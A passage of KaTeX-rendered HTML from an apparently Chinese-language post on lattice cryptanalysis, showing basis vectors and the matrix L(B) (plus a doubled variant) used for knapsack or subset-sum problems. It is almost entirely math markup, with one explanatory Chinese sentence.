style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.902771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span><span class="mspace newline"></span></span></span></span></p><p>将上面这些向量组合成一个如下的矩阵(左边)，还可以乘个2构造如下矩阵(右边)：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>N</mi><msub><mi>a</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>N</mi><msub><mi>a</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>N</mi><msub><mi>a</mi><mi>n</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mfrac><mn>1</mn><mn>2</mn></mfrac></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mfrac><mn>1</mn><mn>2</mn></mfrac></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mfrac><mn>1</mn><mn>2</mn></mfrac></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>N</mi><mi>c</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>↔</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>N</mi><msub><mi>a</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>N</mi><msub><mi>a</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>N</mi><msub><mi>a</mi><mi>n</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>N</mi><mi>c</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">L(B) = \begin{bmatrix}1      &amp;   0    &amp; \cdots &amp;    0  &amp; Na_1 \\0      &amp;   1    &amp; \cdots &amp;    0  &amp; Na_2\\\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots\\0 &amp;    0 &amp; \cdots &amp;    1   &amp; Na_n\\\frac{1}{2}&amp;\frac{1}{2} &amp; \cdots &amp;\frac{1}{2} &amp;Nc\end{bmatrix}\leftrightarrow\begin{bmatrix}2      &amp;   0    &amp; \cdots &amp;    0  &amp; Na_1 \\0      &amp;   2    &amp; \cdots &amp;    0  &amp; Na_2\\\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots\\0 &amp;    0 &amp; \cdots &amp;    2   &amp; Na_n\\1&amp;1 &amp; \cdots &amp;1 &amp;Nc\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:6.665108em;vertical-align:-3.082553999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.555985em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-1.8999750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.4959750000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.0919750000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.6879750000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.283975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.314965000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.555985000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5825540000000005em;"><span style="top:-6.430054000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-5.230054em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.370054em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.170054000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.964946000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.082553999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5825540000000005em;"><span style="top:-6.430054000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.230054em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.370054em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.170054000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.964946000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.082553999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5825540000000005em;"><span style="top:-6.242554000000001em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-5.042554em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-3.182554em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-1.9825540000000008em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-0.777446000000001em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.082553999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5825540000000005em;"><span style="top:-6.430054000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.230054em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.370054em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.170054000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-0.964946000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.082553999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5825540000000005em;"><span style="top:-6.430054000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.230054em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.370054em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.170054000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.964946000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.082553999999999em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.555985em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-1.8999750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.4959750000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.0919750000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.6879750000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.283975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.314965000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.555985000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span 